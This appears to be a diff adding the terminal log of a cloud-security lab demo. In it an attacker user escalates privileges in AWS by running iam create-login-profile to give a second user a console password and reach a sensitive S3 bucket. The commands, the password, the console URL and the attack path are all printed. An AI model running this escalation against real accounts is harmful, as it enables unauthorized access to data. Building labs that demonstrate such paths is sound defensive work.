@@ -1,0 +1,88 @@
+[0;32m========================================[0m
+[0;32mIAM CreateLoginProfile to S3 Bucket Access Demo[0m
+[0;32m========================================[0m
+
+[1;33mStep 1: Extracting credentials from Terraform outputs[0m
+Retrieved access key for: pl-prod-iam-004-bucket-starting-user
+Access Key ID: AKIA2E4JP2...
+ReadOnly Key ID: AKIA2E4JP2...
+Region: us-east-1
+[0;32m✓ Retrieved credentials[0m
+
+[1;33m[demo_permissions] Restricting helpful permissions for validation...[0m
+  Denied helpful permissions on user: pl-prod-iam-004-bucket-starting-user
+[1;33m[demo_permissions] Waiting 15s for IAM policy propagation...[0m
+[0;32m[demo_permissions] Helpful permissions restricted[0m
+[0;32m✓ Successfully extracted and configured credentials[0m
+
+[1;33mStep 2: Verifying identity as starting user[0m
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Current identity: arn:aws:iam::123456789012:user/pl-prod-iam-004-bucket-starting-user
+[0;32m✓ Verified starting user identity[0m
+
+[1;33mStep 3: Getting account ID[0m
+[2m[ReadOnly] $ aws sts get-caller-identity --query 'Account' --output text[0m
+Account ID: 123456789012
+[0;32m✓ Retrieved account ID[0m
+
+[1;33mStep 4: Identifying target bucket[0m
+Target bucket: pl-sensitive-data-iam-004-697683661464-66pzel
+[0;32m✓ Identified target bucket from Terraform output[0m
+
+[1;33mStep 5: Checking if hop1 user has a login profile[0m
+Checking for existing login profile for user: pl-prod-iam-004-bucket-hop1
+[2m[Attacker] $ aws iam get-login-profile --user-name pl-prod-iam-004-bucket-hop1[0m
+[0;32m✓ Confirmed: No login profile exists (ready for attack)[0m
+
+[1;33mStep 6: Verifying we don't have S3 bucket access yet[0m
+Target bucket: pl-sensitive-data-iam-004-697683661464-66pzel
+Attempting to list bucket contents (should fail)...
+[2m[Attacker] $ aws s3 ls s3://pl-sensitive-data-iam-004-697683661464-66pzel[0m
+[0;32m✓ Confirmed: Cannot access bucket (as expected)[0m
+
+[1;33mStep 7: Creating login profile for hop1 user[0m
+Creating console password for user: pl-prod-iam-004-bucket-hop1
+Password: PathfindingLabs123!719fbce7
+
+[0;36m[Attacker] $ aws iam create-login-profile --user-name pl-prod-iam-004-bucket-hop1 --password "PathfindingLabs123!719fbce7" --no-password-reset-required[0m
+{
+    "LoginProfile": {
+        "UserName": "pl-prod-iam-004-bucket-hop1",
+        "CreateDate": "2026-04-17T09:16:42Z",
+        "PasswordResetRequired": false
+    }
+}
+[0;32m✓ Successfully created login profile![0m
+
+[1;33mWaiting 15 seconds for IAM changes to propagate...[0m
+
+[1;33mStep 8: Confirming login profile creation[0m
+[2m[ReadOnly] $ aws iam get-login-profile --user-name pl-prod-iam-004-bucket-hop1 --query 'LoginProfile.UserName' --output text[0m
+[0;32m✓ Confirmed login profile created for pl-prod-iam-004-bucket-hop1[0m
+The hop1 user can now log in via the AWS Console.
+[0;32m✓ Login profile confirmed![0m
+
+[0;32m========================================[0m
+[0;32mAttack Summary[0m
+[0;32m========================================[0m
+Starting Point: User [1;33mpl-prod-iam-004-bucket-starting-user[0m
+Step 1: Used [1;33miam:CreateLoginProfile[0m to create console password for pl-prod-iam-004-bucket-hop1
+Step 2: Gained [1;33mS3 Bucket Access[0m (console login)
+Result: [0;32mS3 Bucket Access[0m
+
+[1;33mAttack Path:[0m
+  pl-prod-iam-004-bucket-starting-user → (CreateLoginProfile) → pl-prod-iam-004-bucket-hop1 → Console Login → S3 Bucket (pl-sensitive-data-iam-004-697683661464-66pzel)
+
+[1;33mAttack Commands:[0m
+  [0;36m$ aws iam create-login-profile --user-name pl-prod-iam-004-bucket-hop1 --password "PathfindingLabs123!719fbce7" --no-password-reset-required[0m
+
+[0;32mConsole Login Information:[0m
+  URL: [1;33mhttps://697683661464.signin.aws.amazon.com/console[0m
+  Username: [1;33mpl-prod-iam-004-bucket-hop1[0m
+  Password: [1;33mPathfindingLabs123!719fbce7[0m
+
+[0;31mIMPORTANT: Run cleanup_attack.sh to delete the login profile[0m
+
+[1;33m[demo_permissions] Restoring helpful permissions...[0m
+  Restored user: pl-prod-iam-004-bucket-starting-user
+[0;32m[demo_permissions] Helpful permissions restored[0m
